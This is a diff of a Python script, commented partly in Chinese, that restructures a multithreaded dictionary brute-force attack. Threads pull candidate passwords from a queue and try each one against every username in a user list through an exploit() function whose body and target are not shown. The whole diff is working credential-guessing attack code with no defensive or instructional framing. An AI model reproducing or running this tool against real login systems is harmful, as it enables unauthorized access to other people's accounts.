@@ -74,15 +74,15 @@ def exploit(user,dic):
 		except Exception as e:
 			pass
 		
-def brute(i,user_queue,passdic):
-	#global _FINISH
+def brute(i,users,pass_queue):
 	print ("I'm thread" + str(i))
-	for passwd in passdic:
-		#print (passwd)
-		while not user_queue.empty():
+	while not pass_queue.empty():
 
-			user = user_queue.get()
-			result = exploit(user,passwd.strip())
+		passwd = pass_queue.get()
+		#print (passwd)
+		for user in users:
+
+			result = exploit(user.strip(),passwd.strip())
 			if result:
 
 				if result == "wrong":	#密码错误就换下一个			
@@ -94,9 +94,6 @@ def brute(i,user_queue,passdic):
 					#break
 			else:
 				pass
-		with open(userdic,'r',encoding='utf-8') as users:
-			for user in users:
-				user_queue.put(user.strip())
 				        
 if __name__ =='__main__':
 
@@ -113,16 +110,23 @@ if __name__ =='__main__':
 
 	n = 10 # threading 数量
 	mythread = []
-	passfile = open(passdic,'r',encoding='utf-8')
-	user_queue = queue.Queue()
-	with open(userdic,'r',encoding='utf-8') as users:
-		for user in users:
-			user_queue.put(user.strip())
+	#passfile = open(passdic,'r',encoding='utf-8')
+	#user_queue = queue.Queue()
+	pass_queue = queue.Queue()
+	userfile = open(userdic,'r',encoding='utf-8')
+	users = userfile.readlines()
+	userfile.close()
+
+
+	with open(passdic,'r',encoding='utf-8') as passwd:
+		for pwd in passwd:
+			pass_queue.put(pwd.strip())
+
 		
 	for i in range(n):
 
 		#username = user_queue.get()
-		t = myThread(target=brute,args=(i,user_queue,passfile))
+		t = myThread(target=brute,args=(i,users,pass_queue))
 		t.setDaemon(True)
 		mythread.append(t)
 
@@ -131,3 +135,6 @@ if __name__ =='__main__':
 
 	for t in mythread:
 		t.join()
+
+
+	
